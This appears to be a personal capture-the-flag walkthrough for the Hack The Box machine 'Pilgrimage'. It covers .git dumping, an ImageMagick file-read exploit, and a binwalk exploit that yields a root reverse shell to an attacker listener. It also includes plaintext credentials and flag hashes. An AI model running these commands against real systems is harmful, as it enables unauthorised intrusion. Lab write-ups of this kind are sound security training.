@@ -1,0 +1,127 @@
+=====================================================================================================
+													******** HTB - machines: Pilgrimage ********
+=====================================================================================================
+Firstly I eported the IP as an env variable and ran an 'nmap' port scan on all ports on the target 
+machine.
+
+** export IP=10.10.11.224
+** nmap -n -Pn -p- $IP --open
+
+Nmap scan report for 10.10.11.219
+PORT   STATE SERVICE
+
+22/tcp open  ssh
+80/tcp open  http
+
+** nmap -n -Pn -p22,80 -sC -sV $IP
+
+Nmap scan report for 10.10.11.219
+Host is up (0.11s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
+|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
+|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-title: Did not follow redirect to http://pilgrimage.htb/
+|_http-server-header: nginx/1.18.0
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+======================================================================================================
+-- Host Enumeration:
+====================
+OS: Linux
+Web Application Technology:
+Web Server Technology: nginx 1.18.0	
+
+user creds:
+emily			abigchonkyboi123
+
+user.txt			=>	8e393fee71120c87dc6ba9487fc588ed
+root.txt			=>	11225336ed57e1d7fc6d18a928fcaef6
+
+=======================================================================================================
+-- Walkthrough:
+===============
+Since we have only ssh and a web server runnig on the hot, we focus on the web server since we have no
+valid user creds.
+
+On inspecting the web app with wfuzz, I see that there is a '.git' file path with returns a 301 respons
+
+Using the tool 'git-dumper', we can enumerate and download the entire git repo to our local machine.
+
+** pip3 install git-dumper
+** /home/demola/.local/bin/git-dumper http://pilgrimage.htb/.git/ ./out_git
+** file out_git/magick
+
+On further inspection of the downloaded git folder, we see and inspect the login.php file. In this file
+we see a file path to an sqlite DB '/var/db/pilgrimage'.
+
+** less out_git/login.php
+
+Since form the logn.php file, the php code uses parameterized queries, we cannot exploit SQLi.
+
+In the downloaded git folder, we see a binary 'magick'. I could not execute this cos its compiled in
+x86_64 cpu and I am on ARM cpu architecture.
+
+** out_git/magick -version			=> ImageMagick 7.1.0-49 beta
+
+But from the tutorial we see that if we check the verison of the tool and look it up on google, we see
+an LFI vuln that canbe explited.
+
+We will use this LFI vuln to download the sqlite db using the filepath found in the login.php file.
+
+** https://github.com/Sybil-Scan/imagemagick-lfi-poc
+** python3 generate.py -f "/var/db/pilgrimage" -o newfan.png
+
+Next we generate the maicious file, upload it to the web server via the webapp, download the reduced
+image with 'wget' and then use exiftool to inspect the file and then use cyberchef online tool to 
+extract the sqlite db from the downloaded file.
+
+** wget http://pilgrimage.htb/shrunk/64d8e6bf1bcbc.png -O mass.png
+** exiftool mass.png -b
+
+Once on cyberchef, select from hex, save the output to a file, use sqlite db browser on kali to view 
+the downloaded file.
+
+In the sqlite browser on kali, select 'open databse', select user column, and we see user emily's creds 
+in there. We use it to log in using ssh and gain an initial foothold on the machine.
+
+For privesc, we do normal enum. when we do 'ps aux' we see a 'malwarescan.sh' file being run by root.
+
+On further inspection of the file, we see that it uses 'inotifywait' & 'binwalk' for malware detection
+
+Next we search for vuln on these two exec, we see nothing on inotify but see somethin on binwalk.
+
+By looking at the version with 'binwalk --help' we were able to look for the vuln for the version used. 
+
+** binwalk --help
+** wget https://www.exploit-db.com/exploits/51249
+
+Next we want to know the file permission onf the directortthat the bash script tries to access
+
+** stat /var/www/pilgrimage.htb/shrunk/			see what privs we have on the folder
+** python3 51249.py mass.png 10.10.14.94 4444
+
+We then change the filename of the malicious png file outputed by the POC of the explit we want to use
+
+** mv binwalk_exploit.png loko.png
+
+Once doen, we set up a webserver on our kali o that we download the generated malicous png file on the
+victim host.
+
+** python3 -m http.server 8000
+** wget http://10.10.14.94:8000/loko.png -O lok.png		On emily's ssh conneciton
+
+Once downloaded on the victim's host, we setup our listener and then copy it to the file path that the 
+bash script acesses.
+
+** nc -lnvvp 4444
+** cp lok.png /var/www/pilgrimage.htb/shrunk/					On emily's ssh connection.
+
+After running the last command above, we get a reverse connection on kali as root.
+
+
+
